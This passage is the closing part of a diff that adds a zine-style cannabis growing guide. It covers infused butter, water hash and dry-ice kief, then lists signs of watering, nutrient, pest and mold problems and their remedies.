+and add the trimmings. Simmer the mixture for a minimum of 2 hours and up
+to 24 hours -- I definitely notice a difference between 2 and 24, but I
+can't say where the threshold is in between. After it's done cooking,
+transfer the mixture through a strainer into another pot or bowl, and place
+this into the refrigerator. The oil or butter (along with the good stuff)
+will rise to the top, and the water will sit at the bottom. Since THC and
+the other chemicals are oil- but not water-soluble, none of it should be
+lost in the water. If the oil hasn't solidified at all, placing it in the
+freezer for a little while should do the trick (too long and the water will
+freeze). Scoop out the oil or butter, and use for baking, or spread on
+toast!
+
+Making water hash is pretty easy. Get yourself a set of extract bags
+(minimum 3) including at least either a 73-ish or 90-ish micron bag. In a
+set of 3 the others should be around 25 microns and at least 180 microns.
+Place each bag, smallest first, into a bucket, and fill the bucket with
+ice-water. Add the trim, and mix for 15-20 minutes with a kitchen or paint
+mixer. Let the mixture settle for about half an hour, then remove each bag
+one at a time. The first will remove the trim, and others after will have
+hash and/or contaminants, depending on how many bags you use. If the set
+comes with a screen, use the screen to press the water out of each mass of
+hash. Scrape the hash off and set aside to dry.
+
+Even easier than water hash is what I like to call white-trash hash. What
+comes out is really kief, but you can press the kief into hash if you want.
+Procure a large container, like a storage bin for a shelf. One with fairly
+high walls is good so it captures as much of the mess as possible. Take
+your 73-micron bag, and put your trim inside. Fill the rest of the bag with
+broken-up dry ice. Tie the bag off (hold it closed), and shake into the
+container until all the glorious beauty falls out. You may want to split
+into multiple sessions, the first being more pure and second-grade after
+that, but I usually just shake until it looks like it's all out.  What you
+end up with in the bag is a green, sloppy mush that you can go ahead and
+discard. The bin, however, is now full of wonderful kief.  Smoke it now, or
+save it for later. Press a chunk into hash between your palms, or put some
+in a baggie in your shoe and walk on it until it turns into hash.
+
+
+0x0D: Signs and Symptoms
+
+I've saved the worst for last. Here are different signs and symptoms of
+various problems you may encounter.
+
+Perfect: The sign of perfection is perky plants, solid to deep-green
+colored (but not too dark). Leaves point upward at a 40-60 degree angle and
+toward the light. Daily growth is visible. Pistils are perky but not
+crooked at the ends.
+
+Over-watering: leaves will curl downward, with the middle section being the
+highest, kind of like it's trying to be an umbrella. Wait as long as
+possible before watering again, and make sure to provide at least a mild
+nutrient solution especially if straight water was used at the previous
+watering.
+
+Under-watering: Can be similar to heat stress when it occurs frequently,
+but otherwise the leaves will lose perkiness and wilt, lying beside the
+stem and pointing downward. Pistils first show signs with crooked ends, and
+soon after they shrivel and change color. Make sure to fully soak the
+container after this occurs, the best way being a slow flow of water rather
+than gushing out of a watering can.
+
+Heat-stress: Leaves fold up and inward, especially at the edges. Fix by
+moving the light further away or reducing the temperature. Supplement with
+extra air flow and a small extra watering (straight water is usually best
+for this to prevent nutrient burn when coupled with heat stress).
+
+Nitrogen deficiency: Leaves yellow to light-green. Treat by increasing
+concentration of veg mix.
+
+Nitrogen toxicity: Leaves very dark green, later start burning. Treat by
+reducing the concentration of veg mix.
+
+Phosphorus toxicity: Leaves dark green (purple tint sometimes) and wilt,
+curling downward. Treat by reducing the concentration of flowering mix.
+
+Various toxicities, deficiencies, pH burn: Chlorosis (dying plant matter)
+on various parts of leaves. Different styles signifiy different problems,
+but overall consider what changes have been made recently. Check pH of
+nutrient solution. Fix by flushing medium with a mild nutrient solution at
+proper pH. Avoid using supplements, just use a basic nutrient mix for the
+current phase. Treat a suspected deficiency with only a slight increase in
+what you think is needed. More often than not micronutrient dificiencies
+are only present when using synthetic nutrients and only when not using any
+other supplements. Mild deficiencies are not likely to show visible
+symptoms.
+
+Bugs!  Many different bugs will want to eat your plants. Some of the most
+annoying are aphids and spider mites. Insecticidal soap works well with
+aphids, and neem oil works extremely well with spider mites. For aphids,
+spray on site.  Most soaps take care of them well. Also consider removing
+infected plant matter. For mites, spray thoroughly and afterward remove
+leaves with noticeable spots since these 90%+ of the time have eggs. Neem
+will kill the mites but not the eggs. Spray again 2-3 days later and again
+a week after the first. Afterward, inspect daily and spray as needed.
+Grasshoppers eat the leaves. Sorry Mr. Grasshopper, but you gotta die. Pick
+them off and get rid of them however you choose.  Caterpillars eat
+everything, especially the buds. Inspect dying bud matter for caterpillars,
+and remove those found. Spray with a Bt solution -- it's a bacteria that
+when eaten causes the caterpillars to stop eating.  These methods are all
+organic (or available as organic). Use synthetic pesticides only in severe
+cases, and only before buds begin forming. Both the insecticidal soap and
+neem oil can be washed and rinsed off with regular soap at harvest if
+necessary.
+
+Mold!  Mold sucks. Bud mold is highly infective and destructive. Bud mold
+is characterized by grey/black along the stem and spreads quickly. Remove
+entire affected plants immediately. Place in quarantine until sure of the
+diagnosis, then destroy any infected plants.  Powdery mildew is annoying
+but treatable. It is easy to spot -- visible white spots with a powdery
+look on top of leaves. Treat by spraying with a baking soda solution and
+increasing air flow. Decrease humidity for up to a week after symptoms
+disappear if possible.
+
+
+0xFF - Fin
+
+That concludes this guide. I hope you've enjoyed reading it, and I hope
+you're now ready to grow some super ultra dank megabuds.
+
+
+|=[ EOF ]=---------------------------------------------------------------=|
